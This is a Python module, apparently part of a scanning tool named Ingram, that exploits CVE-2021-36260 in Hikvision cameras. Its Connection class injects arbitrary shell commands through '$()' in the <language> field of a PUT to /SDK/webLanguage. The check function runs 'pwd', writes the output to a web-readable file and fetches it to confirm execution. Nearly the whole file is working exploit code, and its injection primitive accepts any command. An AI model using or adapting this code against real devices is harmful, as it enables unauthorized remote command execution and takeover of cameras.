"""hikvision cve-2021-36260
Reference: https://github.com/Aiminsun/CVE-2021-36260

We modified the code which from Aiminsun, and make it fit for our program.
Some functions was removed, such as --shell, if you need it, you should clone
Aimisun's code and run it.
"""
import requests

from Ingram.utils import logger


class Connection:

    def __init__(self, rhost, rport=80, proto='http'):
        self.rhost = rhost
        self.rport = rport
        self.proto = proto
        self.remote = requests.Session()
        self.uri = None

        self._init_uri()
        self.remote.headers.update({
            'Host': f'{self.rhost}:{self.rport}',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,sv;q=0.8',
        })

    def send(self, url=None, query_args=None, timeout=5):
        """This weird code will try automatically switch between http/https
        and update Host
        """
        try:
            if url and not query_args:
                return self.get(url, timeout)
            else:
                data = self.put('/SDK/webLanguage', query_args, timeout)
        except requests.exceptions.ConnectionError:
            self.proto = 'https' if self.proto == 'http' else 'https'
            self._init_uri()
            try:
                if url and not query_args:
                    return self.get(url, timeout)
                else:
                    data = self.put('/SDK/webLanguage', query_args, timeout)
            except requests.exceptions.ConnectionError:
                return None
        except requests.exceptions.RequestException:
            return None
        except KeyboardInterrupt:
            return None

        """302 when requesting http on https enabled device"""
        if data.status_code == 302:
            redirect = data.headers.get('Location')
            self.uri = redirect[:redirect.rfind('/')]
            self._update_host()
            if url and not query_args:
                return self.get(url, timeout)
            else:
                data = self.put('/SDK/webLanguage', query_args, timeout)

        return data

    def _update_host(self):
        if not self.remote.headers.get('Host') == self.uri[self.uri.rfind('://') + 3:]:
            self.remote.headers.update({
                'Host': self.uri[self.uri.rfind('://') + 3:],
            })

    def _init_uri(self):
        self.uri = '{proto}://{rhost}:{rport}'.format(proto=self.proto, rhost=self.rhost, rport=str(self.rport))

    def put(self, url, query_args, timeout):
        """Command injection in the <language> tag"""
        query_args = '<?xml version="1.0" encoding="UTF-8"?>' \
                     f'<language>$({query_args})</language>'
        return self.remote.put(self.uri + url, data=query_args, verify=False, allow_redirects=False, timeout=timeout)

    def get(self, url, timeout):
        return self.remote.get(self.uri + url, verify=False, allow_redirects=False, timeout=timeout)


def cve_2021_36260(ip: str) -> list:
    if ':' in ip: ip, port = ip.split(':')
    else: port = 80
    remote = Connection(ip, port)
    cmd = 'pwd'
    try:
        data = remote.send(query_args=f"{cmd}>webLib/x")
        if data is not None:
            data = remote.send(url='/x', query_args=None)
            if data.status_code == 200 and data.text.strip() == '/home':
                logger.info(f"{ip} found cve-2021-36260")
                return [True, '', '', 'cve-2021-36260']
    except Exception as e:
        logger.error(e)
    return [False, ]
